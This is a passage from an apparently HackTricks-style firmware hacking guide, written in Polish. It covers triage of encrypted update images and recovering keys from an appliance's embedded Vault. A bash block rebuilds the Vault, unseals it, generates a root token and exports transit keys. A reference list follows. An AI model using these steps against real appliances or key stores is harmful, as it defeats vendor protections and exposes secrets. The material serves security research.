Gdy obraz aktualizacji łączy niewielkie metadane w plaintext z dużym blobem o wysokiej entropii, przed rozpoczęciem brute-force wykonaj triage kontenera:

- Zrzuć nagłówki, offsety i granice wierszy za pomocą `hexdump`, `xxd`, `strings -tx`, `base64 -d` oraz `binwalk -E`.
- `Salted__` zwykle oznacza format OpenSSL `enc`: kolejne 8 bajtów to salt, a pozostałe bajty to ciphertext.
- Pole Base64, które po dekodowaniu ma dokładnie `256` bajtów, stanowi silną wskazówkę, że mamy do czynienia z ciphertextem RSA-2048 opakowującym losowe hasło firmware/klucz sesyjny.
- Odłączony materiał PGP w tym samym pliku często chroni wyłącznie autentyczność; nie zakładaj, że jest to mechanizm zapewniający poufność.

Jeśli statyczne wyszukiwanie kluczy (`grep`, `strings`, wyszukiwanie PEM/PGP) nie daje rezultatów, wykonaj reverse engineering **operacyjnej ścieżki deszyfrowania**, zamiast szukać wyłącznie kluczy prywatnych:

- Zdekompiluj updater / binary zarządzający i prześledź, kto odczytuje zaszyfrowany blob, który helper/API go rozpakowuje oraz jakiej logicznej nazwy klucza żąda.
- Przeszukaj wyodrębniony root filesystem pod kątem stanu KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), a także unit files i skryptów init.
- Traktuj plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens lub lokalne skrypty auto-unseal KMS jako odpowiednik materiału klucza prywatnego.

Jeśli appliance zawiera oryginalny binary Vault oraz storage backend, odtworzenie tego środowiska jest zwykle łatwiejsze niż ponowne implementowanie mechanizmów wewnętrznych Vault:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Z uprawnieniami root na sklonowanym KMS:

- Ustaw klucze transit jako eksportowalne wyłącznie wewnątrz izolowanego klona: `vault write transit/keys/<name>/config exportable=true`
- Wyeksportuj klucz unwrap: `vault read transit/export/encryption-key/<name>`
- Sprawdź odzyskany klucz RSA, używając dokładnej pary padding/hash stosowanej przez KMS. Nieudane odszyfrowanie z PKCS#1 v1.5 oraz nieudane domyślne odszyfrowanie OAEP **nie dowodzą**, że klucz jest nieprawidłowy; wiele przepływów opartych na Vault używa OAEP z SHA-256, podczas gdy popularne biblioteki domyślnie używają SHA-1.
- Jeśli payload zaczyna się od `Salted__`, dokładnie odtwórz KDF OpenSSL dostawcy (`EVP_BytesToKey`, często MD5 w starszych appliance), zanim podejmiesz próbę odszyfrowania AES-CBC.

Sprowadza to problem „zaszyfrowanego firmware” do bardziej ogólnego problemu: **odzyskaj klucze operacyjne po stronie appliance, a następnie offline odtwórz dokładne parametry unwrap + KDF**.

## Szkolenia i certyfikaty

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## Referencje

- [Cracking Firmware with Claude: Senior-Level Skill, Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
